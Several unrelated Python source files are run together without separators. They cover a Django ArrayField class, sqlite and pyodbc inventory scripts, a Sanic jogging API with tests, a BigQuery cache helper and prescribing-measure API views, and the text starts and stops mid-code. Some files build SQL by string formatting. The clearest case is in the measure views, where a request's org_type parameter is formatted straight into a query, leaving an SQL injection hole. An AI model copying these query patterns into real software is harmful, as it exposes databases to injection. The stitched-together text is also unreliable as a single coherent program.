    def set_attributes_from_name(self, name):
        super().set_attributes_from_name(name)
        self.base_field.set_attributes_from_name(name)

    @property
    def description(self):
        return 'Array of %s' % self.base_field.description

    def db_type(self, connection):
        size = self.size or ''
        return '%s[%s]' % (self.base_field.db_type(connection), size)

    def get_placeholder(self, value, compiler, connection):
        return '%s::{}'.format(self.db_type(connection))

    def get_db_prep_value(self, value, connection, prepared=False):
        if isinstance(value, (list, tuple)):
            return [self.base_field.get_db_prep_value(i, connection, prepared=False) for i in value]
        return value

    def deconstruct(self):
        name, path, args, kwargs = super().deconstruct()
        if path == 'django.contrib.postgres.fields.array.ArrayField':
            path = 'django.contrib.postgres.fields.ArrayField'
        kwargs.update({
            'base_field': self.base_field.clone(),
            'size': self.size,
        })
        return name, path, args, kwargs

    def to_python(self, value):
        if isinstance(value, str):
            # Assume we're deserializing
            vals = json.loads(value)
            value = [self.base_field.to_python(val) for val in vals]
        return value

    def _from_db_value(self, value, expression, connection):
        if value is None:
            return value
        return [
            self.base_field.from_db_value(item, expression, connection)
            for item in value
        ]

    def value_to_string(self, obj):
        values = []
        vals = self.value_from_object(obj)
        base_field = self.base_field

        for val in vals:
            if val is None:
                values.append(None)
            else:
                obj = AttributeSetter(base_field.attname, val)
                values.append(base_field.value_to_string(obj))
        return json.dumps(values)

    def get_transform(self, name):
        transform = super().get_transform(name)
        if transform:
            return transform
        if '_' not in name:
            try:
                index = int(name)
            except ValueError:
                pass
            else:
                index += 1  # postgres uses 1-indexing
                return IndexTransformFactory(index, self.base_field)
        try:
            start, end = name.split('_')
            start = int(start) + 1
            end = int(end)  # don't add one here because postgres slices are weird
        except ValueError:
            pass
        else:
            return SliceTransformFactory(start, end)

    def validate(self, value, model_instance):
        super().validate(value, model_instance)
        for index, part in enumerate(value):
            try:
                self.base_field.validate(part, model_instance)
            except exceptions.ValidationError as error:
                raise prefix_validation_error(
                    error,
                    prefix=self.error_messages['item_invalid'],
                    code='item_invalid',
                    params={'nth': index + 1},
                )
        if isinstance(self.base_field, ArrayField):
            if len({len(i) for i in value}) > 1:
                raise exceptions.ValidationError(
                    self.error_messages['nested_array_mismatch'],
                    code='nested_array_mismatch',
                )

    def run_validators(self, value):
        super().run_validators(value)
        for index, part in enumerate(value):
            try:
                self.base_field.run_validators(part)
            except exceptions.ValidationError as error:
                raise prefix_validation_error(
                    error,
                    prefix=self.error_messages['item_invalid'],
                    code='item_invalid',
                    params={'nth': index + 1},
                )

    def formfield(self, **kwargs):
        return super().formfield(**{
            'form_class': SimpleArrayField,
            'base_field': self.base_field.formfield(),
            'max_length': self.size,
            **kwargs,
        })


@ArrayField.register_lookup
class ArrayContains(lookups.DataContains):
    def as_sql(self, qn, connection):
        sql, params = super().as_sql(qn, connection)
        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))
        return sql, params


@ArrayField.register_lookup
class ArrayContainedBy(lookups.ContainedBy):
    def as_sql(self, qn, connection):
        sql, params = super().as_sql(qn, connection)
        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))
        return sql, params


@ArrayField.register_lookup
class ArrayExact(Exact):
    def as_sql(self, qn, connection):
        sql, params = super().as_sql(qn, connection)
        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))
        return sql, params


@ArrayField.register_lookup
class ArrayOverlap(lookups.Overlap):
    def as_sql(self, qn, connection):
        sql, params = super().as_sql(qn, connection)
        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))
        return sql, params


@ArrayField.register_lookup
class ArrayLenTransform(Transform):
    lookup_name = 'len'
    output_field = IntegerField()

    def as_sql(self, compiler, connection):
        lhs, params = compiler.compile(self.lhs)
        # Distinguish NULL and empty arrays
        return (
            'CASE WHEN %(lhs)s IS NULL THEN NULL ELSE '
            'coalesce(array_length(%(lhs)s, 1), 0) END'
        ) % {'lhs': lhs}, params


@ArrayField.register_lookup
class ArrayInLookup(In):
    def get_prep_lookup(self):
        values = super().get_prep_lookup()
        if hasattr(values, 'resolve_expression'):
            return values
        # In.process_rhs() expects values to be hashable, so convert lists
        # to tuples.
        prepared_values = []
        for value in values:
            if hasattr(value, 'resolve_expression'):
                prepared_values.append(value)
            else:
                prepared_values.append(tuple(value))
        return prepared_values


class IndexTransform(Transform):

    def __init__(self, index, base_field, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.index = index
        self.base_field = base_field

    def as_sql(self, compiler, connection):
        lhs, params = compiler.compile(self.lhs)
        return '%s[%s]' % (lhs, self.index), params                    

    @property
    def output_field(self):
        return self.base_field


class IndexTransformFactory:

    def __init__(self, index, base_field):
        self.index = index
        self.base_field = base_field

    def __call__(self, *args, **kwargs):
        return IndexTransform(self.index, self.base_field, *args, **kwargs)


class SliceTransform(Transform):

    def __init__(self, start, end, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.start = start
        self.end = end

    def as_sql(self, compiler, connection):
        lhs, params = compiler.compile(self.lhs)
        return '%s[%s:%s]' % (lhs, self.start, self.end), params                    


class SliceTransformFactory:

    def __init__(self, start, end):
        self.start = start
        self.end = end

    def __call__(self, *args, **kwargs):
        return SliceTransform(self.start, self.end, *args, **kwargs)


#!usr/bin/env python

"""
file descriptor

"""

__author__ = "Tadhg O'Rourke"
__date__ = "29/08/2019"

import sqlite3

# create connection to db
db = sqlite3.connect("contacts.sqlite")

# run update
update_sql = "UPDATE contacts SET email = 'test@myemail.ie' WHERE email LIKE 'test@email.com'"                    
update_cursor = db.cursor()
update_cursor.execute(update_sql)                    

# commit update
update_cursor.connection.commit()

# get count of rows affected
print(update_cursor.rowcount)

for row in db.execute("SELECT * FROM Contacts"):
    print(row)

update_cursor.close()                    
db.close()

from sqlalchemy.sql import text
from .dbhelper import engine


class User(object):
    def __init__(
        self, user_id, username, hashed_password, roll_id=1, *args, **kwargs                    
    ):
        self.user_id = user_id
        self.username = username
        self.hashed_password = hashed_password
        self.roll_id = roll_id

    def to_dict(self):
        return {"user_id": self.user_id, "username": self.username}

    def save(self):
        connection = engine.connect()
        trans = connection.begin()
        try:
            s = text(
                "INSERT INTO users(username, hashed_password, roll_id) "
                "VALUES(:username, :hashed_password, :roll_id)"
            )
            connection.execute(
                s,
                username=self.username,
                hashed_password=self.hashed_password,
                roll_id=self.roll_id,
            )
            trans.commit()
        except:
            trans.rollback()
            raise
        connection.close()

    @classmethod
    def get_by_username(cls, username):
        assert engine
        s = text(
            "SELECT user_id, username, hashed_password, roll_id "
            "FROM users "
            "WHERE username = :username AND expire_date is null"
        )
        connection = engine.connect()
        rc = connection.execute(s, username=username).fetchone()
        if rc is not None:
            rc = User(rc[0], rc[1], rc[2].decode("utf-8"), rc[3])

        connection.close()
        return rc

    @classmethod
    def username_exists(cls, username):
        assert engine
        s = text(
            "SELECT * "
            "FROM users "
            "WHERE username = :username AND expire_date is null"
        )
        connection = engine.connect()

        rc = (
            False
            if connection.execute(s, username=username).fetchone() is None                    
            else True
        )
        connection.close()
        return rc

import datetime
import json
from sanic import response
from sanic.exceptions import SanicException, InvalidUsage, add_status_code
from sanic_jwt.decorators import protected
from jogging.Contectors.darksky import get_weather_condition
from jogging.Routes.auth import retrieve_user
from jogging.Models.jogging_result import JoggingResult


@add_status_code(409)
class Conflict(SanicException):
    pass


@protected()
async def add_jogging_result(request, *args, **kwargs):
    if (
        request.json is None
        or "date" not in request.json
        or "distance" not in request.json
        or "time" not in request.json
        or "location" not in request.json
    ):
        raise InvalidUsage(
            "invalid payload (should be {date, distance, time, location})"
        )

    distance = request.json["distance"]
    if distance <= 0:
        raise InvalidUsage("distance needs to be positive")

    try:
        date = datetime.datetime.strptime(
            request.json["date"], "%Y-%m-%d"
        ).date()
    except ValueError:
        raise InvalidUsage("invalid date (should be 'YYYY-MM-DD')")

    latlong = request.json["location"].split(" ")

    if len(latlong) != 2:
        raise InvalidUsage("invalid location (should be 'LAT LONG')")

    try:
        lat = float(latlong[0])
        long = float(latlong[1])
    except ValueError:
        raise InvalidUsage(
            "invalid location (lat & long should be floating-point)"
        )

    if not (-90.0 <= lat <= 90.0 and -180 <= long <= 180):
        raise InvalidUsage(
            "invalid location (The latitude must be a number between -90 and 90 and the longitude between -180 and 180)"
        )

    try:
        time = int(request.json["time"])
    except ValueError:
        raise InvalidUsage("invalid time (time should be an integer)")

    if time <= 0:
        raise InvalidUsage("invalid time (time should be positive)")

    condition = await get_weather_condition(lat, long, date)

    if condition is None:
        raise InvalidUsage(
            "can't fetch running conditions for that location & time"
        )

    user_id = retrieve_user(request, args, kwargs)["user_id"]

    jog = JoggingResult(
        user_id,
        request.json["location"],
        date,
        distance,
        time,
        json.dumps(condition["data"][0]),
    )
    jog.save()

    return response.HTTPResponse(status=201)


@protected()
async def get_jogging_results(request, *args, **kwargs):
    page = int(request.args["page"][0]) if "page" in request.args else 0
    limit = int(request.args["count"][0]) if "count" in request.args else 10

    if page < 0 or limit <= 0:
        raise InvalidUsage("invalid paging (page >= 0 and count > 0)")

    q_filter = request.args["filter"][0] if "filter" in request.args else None
    user_id = retrieve_user(request, args, kwargs)["user_id"]

    return response.json(                    
        JoggingResult.load(user_id, q_filter, page, limit), status=200                    
    )

import pytest
from sanic import Sanic
import random
import json
from jogging.main import config_app
from jogging import config
from jogging.Models.user import User

username = None
access_token = None
refresh_token = None


@pytest.yield_fixture
def app():
    config.app = Sanic("test_sanic_app")
    config_app()
    yield config.app


@pytest.fixture
def test_cli(loop, app, sanic_client):

    global username
    while username is None:
        i = random.randint(1, 10000)
        username = f"amichay.oren+{i}@gmail.com"
        if User.username_exists(username):
            username = None

    return loop.run_until_complete(sanic_client(app))


async def test_positive_register_(test_cli):
    data = {"username": username, "password": "testing123G"}
    resp = await test_cli.post("/users", data=json.dumps(data))
    assert resp.status == 201


async def test_positive_login(test_cli):
    data = {"username": username, "password": "testing123G"}
    resp = await test_cli.post("/auth", data=json.dumps(data))
    resp_json = await resp.json()
    print(resp_json)
    global access_token
    access_token = resp_json["access_token"]
    global refresh_token
    refresh_token = resp_json["refresh_token"]
    assert access_token is not None
    assert refresh_token is not None
    assert resp.status == 200


async def test_negative_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {
        "date": "1971-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post(
        "/results", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 400


async def test_positive_jogging_result(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}
    data = {
        "date": "2015-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post(
        "/results", headers=headers, data=json.dumps(data)
    )
    assert resp.status == 201


async def test_positive_load_dataset(test_cli):
    import csv

    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    dsreader = csv.reader(open("jogging_dataset.csv"), delimiter=",")
    for row in dsreader:
        data = {
            "date": row[0],
            "location": row[1],
            "distance": int(row[2]),
            "time": int(row[3]),
        }
        resp = await test_cli.post(
            "/results", headers=headers, data=json.dumps(data)
        )
        assert resp.status == 201


async def test_negative_jogging_result_no_uath(test_cli):
    global access_token
    global refresh_token
    data = {
        "date": "2015-06-20",
        "distance": 2000,
        "time": 405,
        "location": "32.0853 34.7818",
    }
    resp = await test_cli.post("/results", data=json.dumps(data))
    assert resp.status == 400


async def test_positive_get_all_results(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results", headers=headers)
    resp_json = await resp.json()

    assert resp.status == 200


async def test_positive_get_paging(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results?page=0&count=2", headers=headers)                    
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 2

    resp = await test_cli.get("/results?page=1&count=1", headers=headers)                    
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1


async def test_negative_bad_paging(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get("/results?page=-1&count=2", headers=headers)                    
    assert resp.status == 400

    resp = await test_cli.get("/results?page=1&count=0", headers=headers)                    
    assert resp.status == 400


async def test_positive_check_filters(test_cli):
    global access_token
    global refresh_token
    headers = {"Authorization": f"Bearer {access_token}"}

    resp = await test_cli.get(
        "/results?page=0&count=2&filter=date eq '2019-07-15'", headers=headers                    
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 1

    resp = await test_cli.get(
        "/results?filter=(date lt '2018-01-01') AND (time lt 500)",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 4

    resp = await test_cli.get(
        "/results?filter=distance ne 2000", headers=headers
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 8

    resp = await test_cli.get(
        "/results?filter=distance ne 2000 and ((time lt 400) and (time gt 390))",
        headers=headers,
    )
    resp_json = await resp.json()
    assert resp.status == 200
    assert len(resp_json) == 0

#! /usr/bin/env python3
#This is the orderFilledScript that updates the DB when you laser keys.

from datetime import datetime
import pyodbc
import sys
import subprocess as sp
from os import system

def clear():
    system('cls')

def divider():
    print('-' * 70)    

DBNAME = "laserInv"

openConn = False

#Determines wether the user has confirmed the information was typed correctly
confirmed = None

#Determines wether the code should loop for more key entries
orderComplete = False

#Marks that it's not the first loop, so don't ask for order number again
multiKeyOrder = False

#Used to navigate loop where user decides to loop code or not
addMore = None

u_date = datetime.now()

while orderComplete == False:
    try:
        #Taking order info from user
        clear()
        while confirmed != "yes":
            print('Update the key inventory by entering the order information below.')
            divider()
            if multiKeyOrder == False:
                u_orderNum = input('Order #: ')
            u_keyNum = input('Key used (i.e. #29): #')
            u_keysUsed = input('# of keys lased: ')
            clear()
            #Display info and have user confirm if it's correct before committing
            divider()
            print( "{} \n Order #: {} \n Key #: {} \n # of keys lased: {}".format(
                u_date, u_orderNum, u_keyNum, u_keysUsed))
            divider()
            confirmed = input("Is the information above correct? ")
            #If yes then insert this information into the database
            if confirmed == "yes":
                clear()
            #If no prompt them to re-enter the information properly
            elif confirmed == "no":
                clear()
                print('Re-enter the information. \n')
            #If they enter anything other than yes or no, ask again
            else:
                clear()
                print("Must answer yes or no, it's case sensitive because I'm lazy! \n")
        #Reset confirmed for future while loops
        confirmed = "No"
        #Convert some of the user input values to int
        u_keyNum = int(u_keyNum)
        u_keysUsed = int(u_keysUsed)
        #connect to db
        print('Connecting to database...')
        db = pyodbc.connect(Driver='{SQL Server Native Client 11.0}',
                    Server='(LocalDB)\\LocalDB Laser',
                    Database='laserInv',
                    trusted_connection='yes')
        openConn = True
        #cursor 1 to get preCount value
        c1 = db.cursor()
        c1.execute("SELECT invCount FROM keyInventory WHERE keyNum = '%s';" % u_keyNum)                    
        try: 
            #Check to see if cursor one has A result.
            u_preCount = (c1.fetchall()[0][0])
        except IndexError:
            divider()
            print("ERROR: The key number you entered doesn't exist in the keyInventory table.")
            print("TIP: If you know you've typed it correctly, you'll have to add it to the Database with newKey.py") 
            divider()
            input("Press Enter to close...")
            if openConn == True:
                db.close()
                openConn = False
            sys.exit()
        except Exception:
            if openConn == True:
                db.close()
                openConn = False
                divider()
                raise
                divider()
                input("Press Enter to close...")
            sys.exit()
        #Grab datetime for this commit
        u_date = datetime.now()
        #Calculate postCount
        u_postCount = u_preCount - u_keysUsed
        #Insert all the information into ordersFilled Table
        c2 = db.cursor()
        c2.execute("INSERT INTO ordersFilled (submit_time, orderNum, keyNum, keysUsed, preCount, postCount) VALUES (?, ?, ?, ?, ?, ?);", (u_date, u_orderNum,  u_keyNum, u_keysUsed, u_preCount, u_postCount))                    
        c2.commit()
        #Insert the new inventory count into keyInv Table
        c3 = db.cursor()
        c3.execute("UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;", (u_postCount, u_keyNum))                    
        c3.commit()
        clear()
        print('Success! Database has been updated.')
        addMore = None
        #While loop to ask user if they want to remove more keys from inventory
        while addMore != "yes" and addMore != "no": 
            addMore = input('Are there more keys on this order? ')
            if addMore == 'yes':
                #do nothing
                multiKeyOrder = True
                if openConn == True:
                    db.close()
                    openConn = False
            elif addMore == 'no':
                orderComplete = True
                print('Okay, bye!')
            else:
                clear()
                print("Must answer yes or no, it's case sensitive because I'm lazy!")
    except Exception:
    	raise
    finally:
        if openConn == True:
            db.close()
            openConn = False
sys.exit()

#! /usr/bin/env python3
#This is the resupply script, inserts resupply shipment info into keyInventory table

from datetime import datetime
import pyodbc
import sys
import subprocess as sp
from os import system

def clear():
    system('cls')

def divider():
    print('-' * 70)    

DBNAME = "laserInv"

#This variable is used throughout the code to track wether the connection is still
#open, and generally that check will close it and set to false if it is.
openConn = False

#Bool to determine wether code should loop or not.
resupplyComplete = False

#Bool to confirm user input is correct.
confirmed = None

#Determines wether user wants to add more keys to inventory.
addMore = None

#If encapsulates the code, re-runs it if you say you want to enter more resupply info.
while resupplyComplete == False:
    try:
        clear()
        print('Update the key inventory by entering the key resupply info below.')
        divider()
        u_keyNum = input('Key # used (i.e. Key #29): #')
        u_keysAdded = input('# of keys to add to inventory: ')
        clear()
        while confirmed != "yes":
            divider()
            print( "Adding {} key {}'s to the inventory. \nIs this correct?".format(u_keysAdded, u_keyNum))
            divider()
            confirmed = input('Please enter ''yes'' or ''no'': ')
            if confirmed == "yes":
                #Do nothing
                clear()
            elif confirmed == "no":
                clear()
                print('Re-enter the information.')
                u_keyNum = input('Key # used (i.e. Key #29): #')
                u_keysAdded = input('# of keys to add to inventory:')
            else:
                clear()
                print("Must answer yes or no, it's case sensitive because I'm lazy!")
        #If yes then proceed to insert this information into the database
        #First reset confirmed status in case user adds more keys later.
        confirmed = "no"
        #Convert user input values to type int
        u_keyNum = int(u_keyNum)
        u_keysAdded = int(u_keysAdded)
        #connect to db
        print('Connecting to database...')
        db = pyodbc.connect(Driver='{SQL Server Native Client 11.0}',
                            Server='(LocalDB)\\LocalDB Laser',
                            Database=DBNAME,
                            trusted_connection='yes')
        openConn = True
        #cursor 1 to get preCount value
        c1 = db.cursor()
        c1.execute("SELECT invCount FROM keyInventory WHERE keyNum = '%s';" % u_keyNum)                    
        try:
            #Check to see if cursor has A result
            u_preCount = (c1.fetchall()[0][0])
        except IndexError:
            #If sql select statement gets no result
            divider()
            print("ERROR: The key number you entered doesn't exist in the keyInventory table.")
            print("TIP: If you know you've typed it correctly, you'll have to add it to the Database with newKey.py") 
            divider()
            input("Press enter to close...")
            if openConn == True:
                db.close() 
                openConn = False
            sys.exit()
        except Exception:
            #All other exceptions
            if openConn == True:
                db.close()
                openConn = False
            divider()
            raise
            divider()
            input("Press enter to close...")
            sys.exit()
        #If Sql result DOES contain a result, get datetime for this resupply
        u_date = datetime.now()
        #Calculate post resupply Count
        u_postCount = u_preCount + u_keysAdded
        #Insert the resupply information into the resupply table
        c2 = db.cursor()
        c2.execute("INSERT INTO resupply (submit_time, keyNum, keysAdded, preCount, postCount) VALUES (?, ?, ?, ?, ?);", (u_date, u_keyNum, u_keysAdded, u_preCount, u_postCount))                    
        c2.commit()
        #Update the new inventory count into keyInv Table
        c3 = db.cursor()
        c3.execute("UPDATE keyInventory SET invCount = ? WHERE keyNum = ?;", (u_postCount, u_keyNum))                    
        c3.commit()
        print('Success! Database has been updated.')
        divider()
        addMore = None
        while addMore != "yes" and addMore != "no": 
            addMore = input('Would you like to add more keys to the inventory? ')
            if addMore == 'yes':
                #do nothing
                if openConn == True:
                    db.close()
                    openConn = False
            elif addMore == 'no':
                resupplyComplete = True;
                print('Okay, bye!')
            else:
                clear()
                print("Must answer yes or no, it's case sensitive because I'm lazy!")
    except Exception:
        if openConn == True:
            db.close()
            openConn = False
        divider()
        raise
        divider()
        input("Press enter to close...")
        sys.exit()
    finally:
        if openConn == True:
            db.close()
            openConn = False
sys.exit()


import hashlib
import os

import pandas as pd


def query_hash(project_id, query_name, **query_params):

    id_string = "{}/{}?".format(project_id, query_name)
     
    keylist = sorted(query_params.keys())

    for key in keylist:
        id_string += "{}={}&".format(key, query_params[key])

    return hashlib.sha224(id_string.encode('utf8')).hexdigest()

    
def get_result(project_id, query_name, query_params={}, query_dir='bqsql', cache_dir='bqcache', reload=False):

    # compute file name and params hash
    qhash = query_hash(project_id, query_name, **query_params)

    # check if hash.pkl file exists or reload
    cache_file_name = os.path.join(cache_dir, "{}.pkl".format(qhash))

    if not reload and os.path.exists(cache_file_name):
        res = pd.read_pickle(cache_file_name)
    else:

        # read query from file
        query_fn = os.path.join(query_dir, "{}.sql".format(query_name))
        with open(query_fn, 'r') as query_f:
            query_templ = query_f.read()

        # substitute parameters
        query_str = query_templ.format(**query_params)                    

        res = pd.io.gbq.read_gbq(query_str, project_id=project_id, dialect="standard")

        os.makedirs(cache_dir, exist_ok=True)
        res.to_pickle(cache_file_name)

    return res                    

import sqlite3
from sqlite3 import Error
import pandas as pd
import sys
import logging


logger = logging.getLogger(__name__)
log_handler = logging.StreamHandler(sys.stdout)
log_handler.setFormatter(
    logging.Formatter(
        "%(asctime)s - %(name)s - %(levelname)s - %(message)s - %(funcName)s - line %(lineno)d"
    )
)
logger.addHandler(log_handler)
logger.setLevel(logging.INFO)

def create_connection(db_name='cert_db.sqlite3'):
    try:
        conn = sqlite3.connect(db_name)
        return conn
    except Error as e:
        logger.critical(e)
    return None

def dbtables_to_csv():
    with create_connection() as conn:
        table_names = conn.cursor().execute("SELECT name FROM sqlite_master WHERE type='table';").fetchall()
    table_names = [x[0] for x in table_names]
    open_query = "SELECT * FROM {}"                    
    for table in table_names:
        with create_connection() as conn:
            pd.read_sql(open_query.format(table), conn).to_csv('{}.csv'.format(table), index=False)                    

if __name__=='__main__':
    dbtables_to_csv()



import re

from dateutil.relativedelta import relativedelta

from rest_framework.decorators import api_view
from rest_framework.exceptions import APIException
from rest_framework.response import Response

from frontend.measure_tags import MEASURE_TAGS
from frontend.models import ImportLog
from frontend.models import Measure
from frontend.models import MeasureGlobal
from frontend.models import MeasureValue

import view_utils as utils


class MissingParameter(APIException):
    status_code = 400
    default_detail = 'You are missing a required parameter.'


class InvalidMultiParameter(APIException):
    status_code = 400
    default_detail = ('You can specify one org and many measures, '
                      'or one measure and many orgs, but not many of both')


@api_view(['GET'])
def measure_global(request, format=None):
    measures = utils.param_to_list(request.query_params.get('measure', None))
    tags = utils.param_to_list(request.query_params.get('tags', None))
    qs = MeasureGlobal.objects.select_related('measure')
    if measures:
        qs = qs.filter(measure_id__in=measures)
    if tags:
        qs = qs.filter(measure__tags__overlap=tags)
    qs = qs.order_by('measure_id', 'month')
    rolled = {}
    for mg in qs:
        id = mg.measure_id
        d_copy = {
            'date': mg.month,
            'numerator': mg.numerator,
            'denominator': mg.denominator,
            'calc_value': mg.calc_value,
            'percentiles': mg.percentiles,
            'cost_savings': mg.cost_savings
        }
        if id in rolled:
            rolled[id]['data'].append(d_copy)
        else:
            measure = mg.measure
            if measure.tags_focus:
                tags_focus = ','.join(measure.tags_focus)
            else:
                tags_focus = ''
            rolled[id] = {
                'id': id,
                'name': measure.name,
                'title': measure.title,
                'description': measure.description,
                'why_it_matters': measure.why_it_matters,
                'numerator_short': measure.numerator_short,
                'denominator_short': measure.denominator_short,
                'url': measure.url,
                'is_cost_based': measure.is_cost_based,
                'is_percentage': measure.is_percentage,
                'low_is_good': measure.low_is_good,
                'tags_focus': tags_focus,
                'numerator_is_list_of_bnf_codes': measure.numerator_is_list_of_bnf_codes,
                'tags': _hydrate_tags(measure.tags),
                'data': [d_copy]
            }
    d = {
        'measures': [rolled[k] for k in rolled]
    }

    return Response(d)


def _get_org_id_and_type_from_request(request):                    
    """Return an (org_id, org_type) tuple from the request, normalised
    for various backward-compatibilities.

    Returns (None, None) if no org is specified in the request.

    """
    org_id = utils.param_to_list(request.query_params.get('org', []))
    org_id = org_id and org_id[0]
    org_type = None                    
    if 'org_type' in request.query_params:
        org_type = request.query_params['org_type'] + '_id'                    
        if org_type in ['pct_id', 'ccg_id']:                    
            org_type = 'pr.ccg_id'                    
    elif org_id:
        # This is here for backwards compatibility, in case anybody else is
        # using the API.  Now we have measures for regional teams, we cannot
        # guess the type of an org by the length of its code, as both CCGs and
        # regional teams have codes of length 3.
        if len(org_id) == 3:
            org_type = 'pr.ccg_id'                    
        elif len(org_id) == 6:
            org_type = 'practice_id'                    
        else:
            assert False, 'Unexpected org: {}'.format(org_id)
    return (org_id, org_type)                    


@api_view(['GET'])
def measure_numerators_by_org(request, format=None):
    measure = request.query_params.get('measure', None)
    org_id, org_type = _get_org_id_and_type_from_request(request)                    
    this_month = ImportLog.objects.latest_in_category('prescribing').current_at
    three_months_ago = (
        this_month - relativedelta(months=2)).strftime('%Y-%m-01')
    m = Measure.objects.get(pk=measure)
    if m.numerator_is_list_of_bnf_codes:
        if org_type in ['stp_id', 'regional_team_id']:                    
            extra_join = '''
            INNER JOIN frontend_practice pr
            ON p.practice_id = pr.code
            INNER JOIN frontend_pct
            ON frontend_pct.code = pr.ccg_id
            '''
        elif org_type == 'pr.ccg_id':                    
            extra_join = '''
            INNER JOIN frontend_practice pr
            ON p.practice_id = pr.code
            '''
        else:
            extra_join = ''

        # For measures whose numerator sums one of the columns in the
        # prescribing table, we order the presentations by that column.
        # For other measures, the columns used to calculate the numerator is
        # not available here (it's in BQ) so we order by total_items, which is
        # the best we can do.
        #
        # But because the columns in BQ don't match the columns in PG (items vs
        # total_items), and because we alias a column in the query below
        # (actual_cost vs cost) we need to translate the name of the column we
        # use for ordering the results.
        match = re.match(
            'SUM\((items|quantity|actual_cost)\) AS numerator',
            m.numerator_columns
        )

        if match:
            order_col = {
                'items': 'total_items',
                'actual_cost': 'cost',
                'quantity': 'quantity',
            }[match.groups()[0]]
        else:
            order_col = 'total_items'

        # The redundancy in the following column names is so we can
        # support various flavours of `WHERE` clause from the measure
        # definitions that may use a subset of any of these column
        # names
        focus_on_org = org_id and org_type                    
        params = {
            "numerator_bnf_codes": m.numerator_bnf_codes,
            "three_months_ago": three_months_ago,
        }
        if focus_on_org:
            org_condition = "{org_type} = %(org_id)s AND ".format(                    
                org_type=org_type)                    
            org_group = "{org_type}, ".format(                    
                org_type=org_type)                    
            params["org_id"] = org_id
        else:
            org_condition = ""
            org_group = ""
        query = """
            SELECT
              presentation_code AS bnf_code,
              pn.name AS presentation_name,
              SUM(total_items) AS total_items,
              SUM(actual_cost) AS cost,
              SUM(quantity) AS quantity
            FROM
              frontend_prescription p
            INNER JOIN
              frontend_presentation pn
            ON p.presentation_code = pn.bnf_code
            {extra_join}
            WHERE
              {org_condition}
              processing_date >= %(three_months_ago)s
              AND
              pn.bnf_code = ANY(%(numerator_bnf_codes)s)
            GROUP BY
              {org_group}
              presentation_code, pn.name
            ORDER BY {order_col} DESC
            LIMIT 50
        """.format(
            org_condition=org_condition,
            org_group=org_group,
            org_type=org_type,                    
            three_months_ago=three_months_ago,
            extra_join=extra_join,
            order_col=order_col,
        )
        data = utils.execute_query(query, params)
    else:
        data = []
    response = Response(data)
    filename = "%s-%s-breakdown.csv" % (measure, org_id)
    if request.accepted_renderer.format == 'csv':
        response['content-disposition'] = "attachment; filename=%s" % filename
    return response


@api_view(['GET'])
def measure_by_regional_team(request, format=None):
    return _measure_by_org(request, 'regional_team')


@api_view(['GET'])
def measure_by_stp(request, format=None):
    return _measure_by_org(request, 'stp')


@api_view(['GET'])
def measure_by_ccg(request, format=None):
    return _measure_by_org(request, 'ccg')


@api_view(['GET'])
def measure_by_practice(request, format=None):
    return _measure_by_org(request, 'practice')


def _measure_by_org(request, org_type):
    measure_ids = utils.param_to_list(request.query_params.get('measure', None))
    tags = utils.param_to_list(request.query_params.get('tags', []))
    org_ids = utils.param_to_list(request.query_params.get('org', []))
    parent_org_type = request.query_params.get('parent_org_type', None)
    aggregate = bool(request.query_params.get('aggregate'))

    if org_type == 'practice' and not (org_ids or aggregate):
        raise MissingParameter
    if len(org_ids) > 1 and len(measure_ids) > 1:
        raise InvalidMultiParameter

    if parent_org_type is None:
        if org_type == 'practice' and org_ids:
            l = len(org_ids[0])
            assert all(len(org_id) == l for org_id in org_ids)

            if l == 3:
                parent_org_type = 'pct'
            elif l == 6:
                parent_org_type = 'practice'
            else:
                assert False, l
        else:
            parent_org_type = org_type

    measure_values = MeasureValue.objects.by_org(
        org_type,
        parent_org_type,
        org_ids,
        measure_ids,
        tags,
    )

    # Because we access the `name` of the related org for each MeasureValue
    # during the roll-up process below we need to prefetch them to avoid doing
    # N+1 db queries
    org_field = org_type if org_type != 'ccg' else 'pct'
    measure_values = measure_values.prefetch_related(org_field)

    if aggregate:
        measure_values = measure_values.aggregate_by_measure_and_month()

    rsp_data = {
        'measures': _roll_up_measure_values(measure_values, org_type)
    }
    return Response(rsp_data)


def _roll_up_measure_values(measure_values, org_type):
    rolled = {}

    for measure_value in measure_values:
        measure_id = measure_value.measure_id
        measure_value_data = {
            'date': measure_value.month,
            'numerator': measure_value.numerator,
            'denominator': measure_value.denominator,
            'calc_value': measure_value.calc_value,
            'percentile': measure_value.percentile,
            'cost_savings': measure_value.cost_savings,
        }

        if org_type == 'practice':
            if measure_value.practice_id:
                measure_value_data.update({
                    'practice_id': measure_value.practice_id,
                    'practice_name': measure_value.practice.name,
                })
        elif org_type == 'ccg':
            if measure_value.pct_id:
                measure_value_data.update({
                    'pct_id': measure_value.pct_id,
                    'pct_name': measure_value.pct.name,
                })
        elif org_type == 'stp':
            if measure_value.stp_id:
                measure_value_data.update({
                    'stp_id': measure_value.stp_id,
                    'stp_name': measure_value.stp.name,
                })
        elif org_type == 'regional_team':
            if measure_value.regional_team_id:
                measure_value_data.update({
